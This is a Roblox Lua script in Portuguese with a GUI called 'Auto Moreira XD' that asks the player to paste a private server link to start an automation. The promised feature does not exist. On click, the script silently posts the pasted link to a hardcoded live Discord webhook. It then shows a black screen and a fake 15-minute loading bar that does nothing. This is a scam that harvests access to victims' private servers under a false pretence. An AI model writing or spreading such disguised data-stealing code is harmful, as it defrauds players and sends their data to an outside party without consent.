-- CONFIG
local WEBHOOK_URL = "https://discord.com/api/webhooks/1462117939783143518/WSTNnkQ5xQyd-oJAj3SJ6kOOFAE8E2yNlSeyhUefATtz9f9_swVD47FAC3V-O5NKhAlL"
local LOAD_TIME = 15 * 60 -- 15 minutos

local HttpService = game:GetService("HttpService")

-- ================= GUI PRINCIPAL =================
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "AutoMoreiraGUI"

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.fromScale(0.35, 0.3)
frame.Position = UDim2.fromScale(0.325, 0.35)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true

local box = Instance.new("TextBox", frame)
box.Size = UDim2.fromScale(0.9, 0.25)
box.Position = UDim2.fromScale(0.05, 0.2)
box.PlaceholderText = "COLOQUE SEU SERVER PV AQUI!"
box.Text = ""
box.TextScaled = true
box.ClearTextOnFocus = false
box.BackgroundColor3 = Color3.fromRGB(235,235,235)
box.BorderSizePixel = 0

local btn = Instance.new("TextButton", frame)
btn.Size = UDim2.fromScale(0.7, 0.2)
btn.Position = UDim2.fromScale(0.15, 0.6)
btn.Text = "INICIAR AUTO MOREIRA XD"
btn.TextScaled = true
btn.BackgroundColor3 = Color3.fromRGB(210,210,210)
btn.BorderSizePixel = 0

-- ================= LOADING GUI =================
local loadGui = Instance.new("ScreenGui", game.CoreGui)
loadGui.Enabled = false

local black = Instance.new("Frame", loadGui)
black.Size = UDim2.fromScale(1,1)
black.BackgroundColor3 = Color3.new(0,0,0)
black.BorderSizePixel = 0

local barBg = Instance.new("Frame", black)
barBg.Size = UDim2.fromScale(0.6, 0.04)
barBg.Position = UDim2.fromScale(0.2, 0.55)
barBg.BackgroundColor3 = Color3.fromRGB(40,40,40)
barBg.BorderSizePixel = 0
barBg.Visible = false

local bar = Instance.new("Frame", barBg)
bar.Size = UDim2.fromScale(0,1)
bar.BackgroundColor3 = Color3.fromRGB(255,255,255)
bar.BorderSizePixel = 0

-- ================= FUNÇÕES =================
local function isValidLink(text)
	text = text:lower()
	return text:find("roblox.com/games/")
		and (text:find("privateserverlinkcode=") or text:find("privateserverid="))
end

local function sendWebhook(link)
	local data = {
		username = "Auto Moreira XD",
		content = "🔗 **Servidor recebido:**\n"..link
	}

	pcall(function()
		HttpService:PostAsync(
			WEBHOOK_URL,
			HttpService:JSONEncode(data),
			Enum.HttpContentType.ApplicationJson
		)
	end)
end

-- ================= BOTÃO =================
btn.MouseButton1Click:Connect(function()
	local link = box.Text
	if link == "" then return end
	if not isValidLink(link) then return end

	gui.Enabled = false
	loadGui.Enabled = true

	-- tela preta primeiro
	task.wait(1.5)

	-- começa o loading → MANDA PRA WEBHOOK AQUI
	sendWebhook(link)

	barBg.Visible = true

	for i = 1, LOAD_TIME do
		bar.Size = UDim2.fromScale(i / LOAD_TIME, 1)
		task.wait(1)
	end
end)
